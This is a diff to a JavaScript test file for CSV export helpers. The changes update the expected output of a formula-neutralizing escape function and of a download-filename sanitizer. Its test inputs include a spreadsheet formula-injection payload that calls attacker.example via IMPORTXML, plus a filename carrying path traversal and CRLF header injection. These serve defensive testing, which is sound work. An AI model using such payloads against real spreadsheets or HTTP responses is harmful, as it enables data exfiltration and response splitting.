@@ -9,7 +9,7 @@ describe('CSV export helpers', () => {
   });
 
   it('neutralizes spreadsheet formulas in text cells', () => {
-    expect(csvEscape('=IMPORTXML("https://attacker.example")')).toBe('\'=IMPORTXML(""https://attacker.example"")');
+    expect(csvEscape('=IMPORTXML("https://attacker.example")')).toBe('"\'=IMPORTXML(""https://attacker.example"")"');
     expect(csvEscape('+SUM(1,2)')).toBe('"\'+SUM(1,2)"');
     expect(csvEscape('-2+3')).toBe("'-2+3");
     expect(csvEscape('@cmd')).toBe("'@cmd");
@@ -31,7 +31,7 @@ describe('CSV export helpers', () => {
   });
 
   it('sanitizes download filenames for Content-Disposition', () => {
-    expect(sanitizeCsvFilename('../evil\r\nSet-Cookie: x=1.csv')).toBe('..-evilSet-Cookie x=1.csv');
+    expect(sanitizeCsvFilename('../evil\r\nSet-Cookie: x=1.csv')).toBe('..-evilSet-Cookie- x-1.csv');
     expect(sanitizeCsvFilename('relatorio executivo')).toBe('relatorio executivo.csv');
     expect(sanitizeCsvFilename('\0\r\n')).toBe('export.csv');
   });
